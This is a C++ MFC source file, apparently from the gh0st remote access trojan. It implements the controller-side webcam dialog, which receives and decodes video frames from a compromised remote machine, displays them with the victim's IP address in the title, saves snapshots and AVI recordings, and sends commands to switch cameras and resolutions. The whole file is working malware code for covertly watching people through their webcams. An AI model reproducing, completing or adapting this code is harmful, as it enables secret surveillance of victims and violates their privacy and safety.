// WebCamDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "WebCamDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

enum
{
	IDM_SAVEDIB      = 0x0010,				// 保存快照
	IDM_SAVEAVI,				        	// 保存录像
	IDM_WEBCAM_BEGIN = 0x0020
};


/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg dialog

CWebCamDlg::CWebCamDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
: CDialog(CWebCamDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWebCamDlg)
	// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
	
	m_nCount		= 0;
	m_deviceList	= NULL;
	m_nDeviceNums	= 0;
	m_iResNum       = 0;
	
	m_lpbmi			= NULL;
	m_lpScreenDIB	= NULL;
	
	m_nOldWidth = 0;
	m_nWebcamSelected	= 0;
	
	m_dec			= NULL;
	
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
	m_bOnClose = FALSE;
}


void CWebCamDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWebCamDlg)
	// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWebCamDlg, CDialog)
//{{AFX_MSG_MAP(CWebCamDlg)
ON_WM_CLOSE()
ON_WM_SIZE()
ON_WM_SYSCOMMAND()
ON_WM_PAINT()
ON_MESSAGE(WM_GETMINMAXINFO, OnGetMiniMaxInfo)
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg message handlers

void CWebCamDlg::OnReceive()
{
	CString str;
	str.Format(_T("\\\\%s %d * %d 第%d帧 %d%%"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
		m_nCount, m_pContext->m_nTransferProgress);
	SetWindowText(str);	
}

void CWebCamDlg::OnReceiveComplete()
{
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
		DrawDIB();                  //绘图函数
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 视频大小调整成功
		ResetScreen();
		break;
	default:
		break;
	}
}

void CWebCamDlg::DrawDIB()
{
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 ;
	
	// 	LPBYTE	lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer();
	UINT	nBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	
	LPBYTE	lpBuffer = new BYTE[nBufferLen - nHeadLen];
	if (lpBuffer == NULL)
		return;
	
	memcpy(lpBuffer,m_pContext->m_DeCompressionBuffer.GetBuffer() + nHeadLen, nBufferLen - nHeadLen);
	
	DWORD nRet = 0;

    memcpy(m_lpScreenDIB, m_dec->Decode(lpBuffer ,nBufferLen - nHeadLen, nRet) ,m_lpbmi->bmiHeader.biSizeImage);
	
	PostMessage(WM_PAINT);
	
	if (lpBuffer)
		delete [] lpBuffer;
}

void CWebCamDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);
	
	DrawDibClose(m_hDD);
	::ReleaseDC(m_hWnd, m_hDC);
	
	if (m_dec)
	{
		m_dec->Close();
		delete m_dec;
		m_dec = NULL;
	}
	
	if ( !m_aviFile.IsEmpty())
	{
		KillTimer(133);
		
		m_aviFile = "";
		m_aviStream.Close();
	}
	
	if (m_lpScreenDIB)
	{
		delete[] m_lpScreenDIB;
		m_lpScreenDIB = NULL;
	}
	if (m_lpbmi)
	{
		delete [] m_lpbmi;
		m_lpbmi = NULL;
	}
	if (m_deviceList)
	{
		delete[] m_deviceList;
		m_deviceList = NULL;
	}
	
	m_bOnClose = TRUE;
	
	CDialog::OnClose();
}


BOOL CWebCamDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	ResetScreen();  
	
	char* Device_head = NULL;
	char* Device_end  = NULL;
	char* Res_head    = NULL;
	char* Res_end     = NULL;
	
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)//添加右击菜单
	{
// 		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("&Save Snapshot"));
// 		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, _T("Record &Video"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存截图(&S)"));
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, _T("保存录像(&V)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);	
		Device_head = m_deviceList;
		for (int i = 0; i < m_nDeviceNums; i++)
		{
			CMenu SubMenu;
			
			Device_end = strchr(Device_head,'$');
			*Device_end = '\0';
			Res_head = strchr(Device_head,'#') + 1;
			*(Res_head - 1) = '\0';
			SubMenu.CreateMenu();
			do
			{
				ResolutionInfo tempInfo;
				char temp;
				tempInfo.m_DeviceIndex = i;
				Res_end = strchr(Res_head,':');
				if(Res_end == NULL)
					break;
				
				*Res_end = '\0';
				sscanf(Res_head,"%d %c %d",&tempInfo.m_iWidth,&temp,&tempInfo.m_iHeight);
				CString str;
				bool state=true;
				
				for (int i = 0;i <= m_iResNum;i++)
				{
					SubMenu.GetMenuString(IDM_WEBCAM_BEGIN + i-1,str,MF_BYCOMMAND);
					if (lstrcmp(str,CString(Res_head)) == 0) 
					{
						state = false;
						break;
					}
				}
				if (state)
				{
					SubMenu.AppendMenu(MF_STRING,IDM_WEBCAM_BEGIN + m_iResNum,CString(Res_head));
					m_iResNum++;
				}
				
				m_resInfo.push_back(tempInfo);
				
				if(Res_end)
				{
					Res_head = Res_end + 1;
				}
				
			}while(Res_end!=NULL);
			pSysMenu->InsertMenu(-1,MF_STRING|MF_POPUP|MF_BYPOSITION,(UINT)SubMenu.m_hMenu,CString(Device_head));
			Device_head = Device_end + 1;
		}
	}
	
	// 初始化窗口大小结构
	InitMMI();
	
	m_hDD = DrawDibOpen();
	m_hDC = ::GetDC(m_hWnd);
	
	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	
	return TRUE;  // return TRUE unless you set the focus to a control
	// EXCEPTION: OCX Property Pages should return FALSE
}

// 改变Dlg size
void CWebCamDlg::InitMMI()
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	// 边框的宽度
	int	nBorderWidth = rectClient.left - rectWindow.left;
	
	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;
	
	// 调整窗口到远程大小
	MoveWindow(&rectWindow);
	
	int	nTitleWidth = rectClient.top - rectWindow.top; // 标题栏的高度
	int	nWidthAdd = nBorderWidth * 2;
	int	nHeightAdd = nTitleWidth + nBorderWidth;
	
	int	nMaxWidth = GetSystemMetrics(SM_CXSCREEN);
	int	nMaxHeight = GetSystemMetrics(SM_CYSCREEN);
	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	m_MMI.ptMinTrackSize.y = m_lpbmi->bmiHeader.biHeight + nHeightAdd;
	
	
	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;
	
	// 最大的Track尺寸也要改变
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
	
}

void CWebCamDlg::ResetScreen()
{
	if (m_dec)
	{
		m_dec->Close();
		delete m_dec;
		m_dec = NULL;
	}
	if (m_lpbmi)
	{
		delete [] m_lpbmi;
		m_lpbmi = NULL;
	}
	if (m_lpScreenDIB)
	{
		delete[] m_lpScreenDIB;
		m_lpScreenDIB = NULL;
	}
	
	int	nBmiSize = sizeof(BITMAPINFO);
	int nStrLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1 - nBmiSize - sizeof(int);
	
	m_lpbmi	= (LPBITMAPINFO) new BYTE[nBmiSize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBmiSize);
	memcpy(&m_nDeviceNums,m_pContext->m_DeCompressionBuffer.GetBuffer(1 + nBmiSize),sizeof(int));
	if (m_deviceList)
	{
		delete[] m_deviceList;
		m_deviceList = NULL;
	}
	LPBYTE szBuffe = new BYTE[nStrLen+1];
	m_deviceList = (char*) szBuffe;
	memcpy(m_deviceList,m_pContext->m_DeCompressionBuffer.GetBuffer(1 + nBmiSize + sizeof(int)),nStrLen);
	
	
	m_lpScreenDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	
	memset(&m_MMI, 0, sizeof(MINMAXINFO));
	
	if (IsWindowVisible())
		InitMMI();
	
	if (m_dec == NULL)
	{
		m_dec = new CXvidDec() ;
		m_dec->AttachCaller(m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight) ; 
		m_dec->XVID_GLOBAL_INIT() ; 
		m_dec->Open() ; 
	}
	
	CString str;
	str.Format(_T("\\\\%s %d * %d"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);
	
}

void CWebCamDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	// TODO: Add your message handler code here
	if (!IsWindowVisible())
		return;
	
	// 按比例调整窗口大小
	int	x = m_lpbmi->bmiHeader.biWidth, y = m_lpbmi->bmiHeader.biHeight; // x:y
	
	RECT	rectClientToScreen, rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	GetClientRect(&rectClientToScreen);
	ClientToScreen(&rectClientToScreen);  
	// 边框的宽度
	int	nBorderWidth = rectClientToScreen.left - rectWindow.left;
	
	int	nWindowWidth = rectWindow.right - rectWindow.left;
	int	nWindowHeight = rectWindow.bottom - rectWindow.top;
	
	// 宽发生变化
	if (m_nOldWidth != nWindowWidth)
		rectWindow.bottom = rectClientToScreen.top + nBorderWidth + (rectClient.right * y) / x;
	else
		rectWindow.right = rectClientToScreen.left + nBorderWidth + (rectClient.bottom * x) / y;
	   
	m_nOldWidth = nWindowWidth;
	
	MoveWindow(&rectWindow);
}

BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

LRESULT	CWebCamDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
{	
	// 如果m_MMI已经被赋值
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lparam, &m_MMI, sizeof(MINMAXINFO));
	
	return NULL;
}

bool CWebCamDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
	if(dlg.DoModal () != IDOK)
		return false;
	
	BITMAPFILEHEADER	hdr;
	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("文件保存失败");
		return false;
	}
	
	// BITMAPINFO大小
	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	
	// Fill in the fields of the file header
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize			= lpbi->bmiHeader.biSizeImage + sizeof(hdr);
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof(hdr) + nbmiSize;
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(lpbi, nbmiSize);
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, lpbi->bmiHeader.biSizeImage);
	file.Close();
	
	return true;
}

void CWebCamDlg::SaveAvi()
{
	CMenu	*pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile = "";
		m_aviStream.Close();
		::KillTimer(m_hWnd,133);

		return;
	}
	
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
	CFileDialog dlg(FALSE, _T("avi"), strFileName, OFN_OVERWRITEPROMPT, _T("Video(*.avi)|*.avi|"), this);
	if(dlg.DoModal () != IDOK)
		return;
	
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, m_lpbmi))
	{
		m_aviFile = _T("");
		MessageBox(_T("Create Video(*.avi) Failed"));	
	}
	else
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
		::SetTimer(m_hWnd,133,250,NULL);
	}
	
}

void CWebCamDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	
	switch (nID)
	{
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SAVEAVI:
		SaveAvi();
		break;
	default:
		{
			if (nID >= IDM_WEBCAM_BEGIN && nID < (IDM_WEBCAM_BEGIN + m_iResNum))
			{
				m_nWebcamSelected = m_resInfo[nID - IDM_WEBCAM_BEGIN].m_DeviceIndex;
				SendResetScreen(m_resInfo[nID - IDM_WEBCAM_BEGIN].m_iWidth, m_resInfo[nID - IDM_WEBCAM_BEGIN].m_iHeight);
				//	CheckMenuRadioItem(IDM_WEBCAM_BEGIN, IDM_WEBCAM_BEGIN + m_iResNum, nID, MF_BYCOMMAND);
			}
			else
			{
				CDialog::OnSysCommand(nID, lParam);
			}
		}
	}
}

bool CWebCamDlg::SendResetScreen(int nWidth, int nHeight)
{
	if (GetSystemMenu(FALSE)->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		MessageBox(_T("Please Stop Recording .."),_T("Logion"));
		return false;
	}
	
	BYTE	bPacket[13];
	bPacket[0] = COMMAND_WEBCAM_RESIZE;
	*((LPDWORD)&bPacket[1]) = nWidth;
	*((LPDWORD)&bPacket[5]) = nHeight;
	*((LPDWORD)&bPacket[9]) = m_nWebcamSelected;
	m_iocpServer->Send(m_pContext, bPacket, sizeof(bPacket));
	
	return true;
}

void CWebCamDlg::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Add your message handler code here
	// 不为绘图消息调用 CDialog::OnPaint()
	if (m_lpScreenDIB == NULL)
	{
		return;
	}
	RECT rect;
	GetClientRect(&rect);
	
	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)m_lpbmi,
		m_lpScreenDIB,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);
	
	if (!m_aviFile.IsEmpty())
	{
		LPCTSTR	lpTipsString = "Recording ...";
		// 提示正在录像
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}
	// Do not call CDialog::OnPaint() for painting messages
}

void CWebCamDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	if (!m_bOnClose)
		OnClose();
	
	delete this;
	CDialog::PostNcDestroy();
}

void CWebCamDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	// 写入录像文件
	if (!m_aviFile.IsEmpty())
	{		
		m_aviStream.Write(m_lpScreenDIB);
	}
	
	CDialog::OnTimer(nIDEvent);
}
